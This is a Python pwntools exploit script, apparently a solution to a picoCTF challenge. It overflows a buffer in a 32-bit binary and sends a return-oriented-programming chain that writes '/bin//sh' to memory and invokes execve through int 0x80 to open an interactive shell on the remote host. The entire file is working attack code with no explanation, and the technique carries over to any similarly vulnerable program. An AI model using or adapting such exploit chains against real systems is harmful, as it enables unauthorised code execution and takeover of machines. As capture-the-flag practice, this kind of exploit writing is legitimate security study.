from pwn import *

binary = './vuln'
elf = context.binary = ELF(binary)

#x = process(binary)
p = remote('saturn.picoctf.net',60316)

payload = b'a'*28
payload+= p32(0x080583b9) # pop edx ; pop ebx ; ret
payload+= p32(0x080e5060) # @ .data
payload+= p32(0x41414141) # padding
payload+= p32(0x080b073a) # pop eax ; ret
payload+= b'/bin'
payload+= p32(0x080590f2) # mov dword ptr [edx], eax ; ret
payload+= p32(0x080583b9) # pop edx ; pop ebx ; ret
payload+= p32(0x080e5064) # @ .data + 4
payload+= p32(0x41414141) # padding
payload+= p32(0x080b073a) # pop eax ; ret
payload+= b'//sh'
payload+= p32(0x080590f2) # mov dword ptr [edx], eax ; ret
payload+= p32(0x080583b9) # pop edx ; pop ebx ; ret
payload+= p32(0x080e5068) # @ .data + 8
payload+= p32(0x41414141) # padding
payload+= p32(0x0804fb80) # xor eax, eax ; ret
payload+= p32(0x080590f2) # mov dword ptr [edx], eax ; ret
payload+= p32(0x08049022) # pop ebx ; ret
payload+= p32(0x080e5060) # @ .data
payload+= p32(0x08049e29) # pop ecx ; ret
payload+= p32(0x080e5068) # @ .data + 8
payload+= p32(0x080583b9) # pop edx ; pop ebx ; ret
payload+= p32(0x080e5068) # @ .data + 8
payload+= p32(0x080e5060) # padding without overwrite ebx
payload+= p32(0x0804fb80) # xor eax, eax ; ret
payload+= p32(0x0808054e) # inc eax ; ret
payload+= p32(0x0808054e) # inc eax ; ret
payload+= p32(0x0808054e) # inc eax ; ret
payload+= p32(0x0808054e) # inc eax ; ret
payload+= p32(0x0808054e) # inc eax ; ret
payload+= p32(0x0808054e) # inc eax ; ret
payload+= p32(0x0808054e) # inc eax ; ret
payload+= p32(0x0808054e) # inc eax ; ret
payload+= p32(0x0808054e) # inc eax ; ret
payload+= p32(0x0808054e) # inc eax ; ret
payload+= p32(0x0808054e) # inc eax ; ret
payload+= p32(0x0804a3c2) # int 0x80

p.recv()
p.sendline(payload)

p.interactive()
